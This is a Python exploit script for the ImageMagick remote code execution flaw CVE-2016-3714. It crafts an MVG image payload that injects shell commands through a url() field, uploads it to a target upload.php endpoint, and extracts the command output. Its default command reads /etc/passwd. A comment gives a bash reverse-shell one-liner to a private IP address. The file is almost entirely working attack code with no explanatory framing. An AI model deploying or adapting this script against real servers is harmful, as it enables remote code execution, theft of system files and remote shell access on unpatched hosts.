# -*- coding: utf-8 -*-
# Created by restran on 2016/10/18
from __future__ import unicode_literals, absolute_import

"""
ImageMagic 漏洞
ImageMagick 图象处理软件存在远程代码执行(CVE-2016-3714)
"""

import requests
import os
import sys
import logging

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

logger = logging.getLogger(__name__)

flag_text = 'this_is_boundary_123456789'
im_code = '''push graphic-context

viewbox 0 0 640 480

fill 'url(https://example.com/image.jpg";echo %s;%s;echo %s")'

pop graphic-context
'''

target_url = 'http://192.168.137.136/upload.php'
# 想要执行的 shell 命令
# 反弹 shell 的命令 bash -i >& /dev/tcp/192.168.137.131/3333 0>&1
cmd_code = 'cat /etc/passwd'


def exploit(url, shell_code):
    payload = im_code % (flag_text, shell_code, flag_text)
    files = {'fileToUpload': ('bash.jpg', payload)}
    r = requests.post(url, files=files)

    if r.status_code == 200:
        output = r.text.split(flag_text)[1].strip()
        logger.info(output)
        return
        # patten = r'%s(.)*%s' % (flag_text, flag_text)
        # patten = re.compile(patten, re.S)
        # match = patten.search(r.text)
        # if match:
        #     output = match.group()
        #     output = output.replace(flag_text, '').strip()
        #     logger.info(output)
        #     return

    logger.info('error')


def main():
    exploit(target_url, cmd_code)


if __name__ == '__main__':
    main()
